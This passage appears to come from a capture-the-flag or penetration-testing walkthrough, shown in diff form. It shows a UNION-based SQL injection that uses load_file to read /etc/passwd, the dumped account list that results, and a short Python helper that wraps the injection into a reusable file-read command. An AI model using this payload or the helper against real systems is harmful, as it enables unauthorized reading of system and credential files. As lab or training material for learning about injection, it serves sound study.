@@ -1,0 +1,83 @@
+injection> 3 union select load_file('/etc/passwd'),2 from information_schema.user_privileges
+[id: root:*:0:0:Charlie &:/root:/bin/ksh
+daemon:*:1:1:The devil himself:/root:/sbin/nologin
+operator:*:2:5:System &:/operator:/sbin/nologin
+bin:*:3:7:Binaries Commands and Source:/:/sbin/nologin
+build:*:21:21:base and xenocara build:/var/empty:/bin/ksh
+sshd:*:27:27:sshd privsep:/var/empty:/sbin/nologin
+_portmap:*:28:28:portmap:/var/empty:/sbin/nologin
+_identd:*:29:29:identd:/var/empty:/sbin/nologin
+_rstatd:*:30:30:rpc.rstatd:/var/empty:/sbin/nologin
+_rusersd:*:32:32:rpc.rusersd:/var/empty:/sbin/nologin
+_fingerd:*:33:33:fingerd:/var/empty:/sbin/nologin
+_x11:*:35:35:X Server:/var/empty:/sbin/nologin
+_unwind:*:48:48:Unwind Daemon:/var/empty:/sbin/nologin
+_switchd:*:49:49:Switch Daemon:/var/empty:/sbin/nologin
+_traceroute:*:50:50:traceroute privdrop user:/var/empty:/sbin/nologin
+_ping:*:51:51:ping privdrop user:/var/empty:/sbin/nologin
+_unbound:*:53:53:Unbound Daemon:/var/unbound:/sbin/nologin
+_dpb:*:54:54:dpb privsep:/var/empty:/sbin/nologin
+_pbuild:*:55:55:dpb build user:/nonexistent:/sbin/nologin
+_pfetch:*:56:56:dpb fetch user:/nonexistent:/sbin/nologin
+_pkgfetch:*:57:57:pkg fetch user:/nonexistent:/sbin/nologin
+_pkguntar:*:58:58:pkg untar user:/nonexistent:/sbin/nologin
+_spamd:*:62:62:Spam Daemon:/var/empty:/sbin/nologin
+www:*:67:67:HTTP Server:/var/www:/sbin/nologin
+_isakmpd:*:68:68:isakmpd privsep:/var/empty:/sbin/nologin
+_rpki-client:*:70:70:rpki-client user:/nonexistent:/sbin/nologin
+_syslogd:*:73:73:Syslog Daemon:/var/empty:/sbin/nologin
+_pflogd:*:74:74:pflogd privsep:/var/empty:/sbin/nologin
+_bgpd:*:75:75:BGP Daemon:/var/empty:/sbin/nologin
+_tcpdump:*:76:76:tcpdump privsep:/var/empty:/sbin/nologin
+_dhcp:*:77:77:DHCP programs:/var/empty:/sbin/nologin
+_mopd:*:78:78:MOP Daemon:/var/empty:/sbin/nologin
+_tftpd:*:79:79:TFTP Daemon:/var/empty:/sbin/nologin
+_rbootd:*:80:80:rbootd Daemon:/var/empty:/sbin/nologin
+_ppp:*:82:82:PPP utilities:/var/empty:/sbin/nologin
+_ntp:*:83:83:NTP Daemon:/var/empty:/sbin/nologin
+_ftp:*:84:84:FTP Daemon:/var/empty:/sbin/nologin
+_ospfd:*:85:85:OSPF Daemon:/var/empty:/sbin/nologin
+_hostapd:*:86:86:HostAP Daemon:/var/empty:/sbin/nologin
+_dvmrpd:*:87:87:DVMRP Daemon:/var/empty:/sbin/nologin
+_ripd:*:88:88:RIP Daemon:/var/empty:/sbin/nologin
+_relayd:*:89:89:Relay Daemon:/var/empty:/sbin/nologin
+_ospf6d:*:90:90:OSPF6 Daemon:/var/empty:/sbin/nologin
+_snmpd:*:91:91:SNMP Daemon:/var/empty:/sbin/nologin
+_ypldap:*:93:93:YP to LDAP Daemon:/var/empty:/sbin/nologin
+_rad:*:94:94:IPv6 Router Advertisement Daemon:/var/empty:/sbin/nologin
+_smtpd:*:95:95:SMTP Daemon:/var/empty:/sbin/nologin
+_rwalld:*:96:96:rpc.rwalld:/var/empty:/sbin/nologin
+_nsd:*:97:97:NSD Daemon:/var/empty:/sbin/nologin
+_ldpd:*:98:98:LDP Daemon:/var/empty:/sbin/nologin
+_sndio:*:99:99:sndio privsep:/var/empty:/sbin/nologin
+_ldapd:*:100:100:LDAP Daemon:/var/empty:/sbin/nologin
+_iked:*:101:101:IKEv2 Daemon:/var/empty:/sbin/nologin
+_iscsid:*:102:102:iSCSI Daemon:/var/empty:/sbin/nologin
+_smtpq:*:103:103:SMTP Daemon:/var/empty:/sbin/nologin
+_file:*:104:104:file privsep:/var/empty:/sbin/nologin
+_radiusd:*:105:105:RADIUS Daemon:/var/empty:/sbin/nologin
+_eigrpd:*:106:106:EIGRP Daemon:/var/empty:/sbin/nologin
+_vmd:*:107:107:VM Daemon:/var/empty:/sbin/nologin
+_tftp_proxy:*:108:108:tftp proxy daemon:/nonexistent:/sbin/nologin
+_ftp_proxy:*:109:109:ftp proxy daemon:/nonexistent:/sbin/nologin
+_sndiop:*:110:110:sndio privileged user:/var/empty:/sbin/nologin
+_syspatch:*:112:112:syspatch unprivileged user:/var/empty:/sbin/nologin
+_slaacd:*:115:115:SLAAC Daemon:/var/empty:/sbin/nologin
+nobody:*:32767:32767:Unprivileged user:/nonexistent:/sbin/nologin
+_mysql:*:502:502:MySQL Account:/nonexistent:/sbin/nologin
+lucille:*:1002:1002:,,,:/home/lucille:/bin/csh
+node:*:1003:1003::/home/node:/bin/ksh
+_dbus:*:572:572:dbus user:/nonexistent:/sbin/nologin
+_redis:*:686:686:redis account:/var/redis:/sbin/nologin
+david:*:1004:1004:,,,:/home/david:/bin/csh
+john:*:1005:1005::/home/john:/bin/csh
+ftp:*:1006:1006:FTP:/home/ftp:/sbin/nologin
+, name: 2]
+I’ll add a read command to my Python shell:
+
+    def do_read(self, args):
+        if len(args) == 0:
+            print("[-] Usage: read [filename]")
+            return
+        results = self.send_connected(f"3 union select load_file('{args}'),2 from information_schema.user_privileges")
+        print(results[5:-10])
